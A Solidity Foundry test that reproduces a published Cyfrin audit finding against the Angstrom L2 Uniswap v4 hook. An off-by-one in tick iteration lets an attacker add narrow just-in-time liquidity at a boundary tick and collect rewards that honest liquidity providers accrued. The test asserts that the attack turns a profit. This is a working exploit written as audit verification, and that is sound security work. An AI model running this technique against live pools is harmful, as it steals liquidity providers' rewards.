// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

// Third Proof of Vulnerability for finding 63008 (Cyfrin, Sorella L2 Angstrom).
// Same bug as PoV63008_AngstromL2.t.sol: TickIteratorLib.reset seeds the downward
// iterator at `startTick` instead of `startTick + 1`, so a zero-for-one swap that
// starts exactly on a position's upper boundary tick skips that tick.
//
// This test is the report's Proof of Concept #3, the full attack. Honest users
// build up rewards in a wide position [0, 50). The attacker moves the price up to
// a boundary tick, adds a narrow position just below it, and swaps back down. The
// skipped boundary tick means the attacker's liquidity is left out of the reward
// split, so the growth per unit of liquidity is too large and the attacker's
// narrow position collects the rewards. The attacker then removes the position.
//
// One change from the report: the report's test only logs the profit and asserts
// nothing. Here the test asserts that the profit in ETH is above zero, so it PASSES
// on the vulnerable code. The report's fix note says the attack is no longer
// profitable after the fix, so the assertion is expected to FAIL there. The rest
// of the test is the report's code, with commented-out debug lines removed.
//
// Source: data_collection/tier1_after_2025-08-31/63008.md (published Cyfrin PoC #3).
// Run scoped with --match-path so the inherited AngstromL2Test suite is not re-run.
// Runs only offline, against local audited code.

import {AngstromL2Test} from "./AngstromL2.t.sol";
import {UniV4Inspector} from "./_mocks/UniV4Inspector.sol";
import {IUniV4} from "../src/interfaces/IUniV4.sol";
import {PoolKey} from "v4-core/src/types/PoolKey.sol";
import {PoolId, PoolIdLibrary} from "v4-core/src/types/PoolId.sol";
import {TickMath} from "v4-core/src/libraries/TickMath.sol";
import {console2} from "forge-std/console2.sol";

contract PoV63008_StealRewards is AngstromL2Test {
    using PoolIdLibrary for PoolKey;
    using IUniV4 for UniV4Inspector;
    using TickMath for int24;

    struct AttackConfig {
        uint128 INIT_LIQUIDITY;
        uint256 LOOPS_TO_BUILD_UP_REWARDS;
        uint256 PRIORITY_FEE_TO_BUILD_UP_REWARDS;
        uint256 ATTACKER_PRIORITY_FEE;
        int24 INIT_T0;
        int24 INIT_T1;
        int24 START_TICK;
    }

    function test_cyfrin_stealAllRewards() public {
        AttackConfig memory cfg = AttackConfig({
            INIT_LIQUIDITY: 1e22,
            LOOPS_TO_BUILD_UP_REWARDS: 5,
            PRIORITY_FEE_TO_BUILD_UP_REWARDS: 1000 gwei,
            ATTACKER_PRIORITY_FEE: 5 gwei, // As low as will win TOB because JIT tax must be paid
            INIT_T0: 0,
            INIT_T1: 50,
            START_TICK: 17
        });

        PoolKey memory key = initializePool(address(token), 10, cfg.START_TICK);
        PoolId id = key.toId();

        addLiquidity(key, cfg.INIT_T0, cfg.INIT_T1, cfg.INIT_LIQUIDITY);

        /* Swap back and forth to build up rewards */
        setPriorityFee(cfg.PRIORITY_FEE_TO_BUILD_UP_REWARDS);
        for (uint256 i = 0; i < cfg.LOOPS_TO_BUILD_UP_REWARDS; i++) {
            bumpBlock();
            router.swap(key, true, -10_000e18, int24(cfg.INIT_T0 + 1).getSqrtPriceAtTick());
            bumpBlock();
            router.swap(key, false, -10_000e18, int24(cfg.START_TICK).getSqrtPriceAtTick());
        }

        console2.log("\n\n\n *** ATTACK STARTS ***\n\n\n");

        uint256 rewardsToSteal =
            angstrom.getPendingPositionRewards(key, address(router), cfg.INIT_T0, cfg.INIT_T1, bytes32(0));

        uint256 ethBefore = address(router).balance;
        uint256 tokBefore = token.balanceOf(address(router));

        int24 attackTickUpper = (cfg.START_TICK + 10) / 10 * 10;
        int24 attackTickLower = attackTickUpper - 10;
        assertLt(attackTickUpper, cfg.INIT_T1, "attackTickUpper >= INIT_T1");
        assertGt(attackTickLower, cfg.INIT_T0, "attackTickLower <= INIT_T0");

        /* Step 1: Attacker moves price to next tick boundary */

        setPriorityFee(0);
        bumpBlock();
        uint256 startPrice = TickMath.getSqrtPriceAtTick(cfg.START_TICK);
        router.swap(key, false, -10_000e18, int24(attackTickUpper).getSqrtPriceAtTick());

        /* Step 2: Attacker swaps zero-to-one back to cfg.START_TICK */

        uint256 swapTax = angstrom.getSwapTaxAmount(cfg.ATTACKER_PRIORITY_FEE);
        uint128 ratio = uint128(rewardsToSteal) * 10_000 / uint128(swapTax);
        uint128 attackLiquidity = cfg.INIT_LIQUIDITY * ratio / 10_000;
        console2.log("Calculated ratio as: %s", ratio);

        bumpBlock();
        setPriorityFee(cfg.ATTACKER_PRIORITY_FEE);
        uint256 jitTax = angstrom.getJitTaxAmount(cfg.ATTACKER_PRIORITY_FEE);

        addLiquidity(key, attackTickLower, attackTickUpper, attackLiquidity);
        /* Just swap down to "price at attackTickUpper minus 1" to save on token1 */
        router.swap(key, true, -10e18, (attackTickUpper - 1).getSqrtPriceAtTick());

        (, int256 liqNet) = manager.getTickLiquidity(id, attackTickUpper);
        console2.log("tick liquidity[%s]: %s", vm.toString(attackTickUpper), vm.toString(liqNet));

        /* Calculate attackRewards before removeLiquidity */
        uint256 attackRewards = angstrom.getPendingPositionRewards(
            key, address(router), attackTickUpper - 10, attackTickUpper, bytes32(0)
        );

        // Attacker removes the liquidity they added
        router.modifyLiquidity(key, attackTickUpper - 10, attackTickUpper, -int128(attackLiquidity), bytes32(0));

        console2.log("--------------------------------------------------------");
        console2.log("Swap tax:       %s", swapTax);
        console2.log("rewardsToSteal: %s", rewardsToSteal);
        console2.log("Attack rewards: %s", attackRewards);
        console2.log("JIT tax paid:   %s", (jitTax * 2));

        int256 ethDelta = int256(address(router).balance) - int256(ethBefore);
        int256 tokDelta = int256(token.balanceOf(address(router))) - int256(tokBefore);

        /* Price is calculated with respect to START TICK */
        uint256 priceX96 = startPrice;
        uint256 price = priceX96 * priceX96 * 1e18 / 2 ** 192;
        int256 profitInEth = ethDelta + tokDelta * 1e18 / int256(price);

        console2.log("price:          %s", price);
        console2.log("ETH delta:      %s", ethDelta);
        console2.log("TOK delta:      %s", tokDelta);
        console2.log("Profit (ETH):   %s", profitInEth);

        // Added oracle: the attack must make a profit on the vulnerable code.
        assertGt(profitInEth, 0, "attack is not profitable");
    }
}
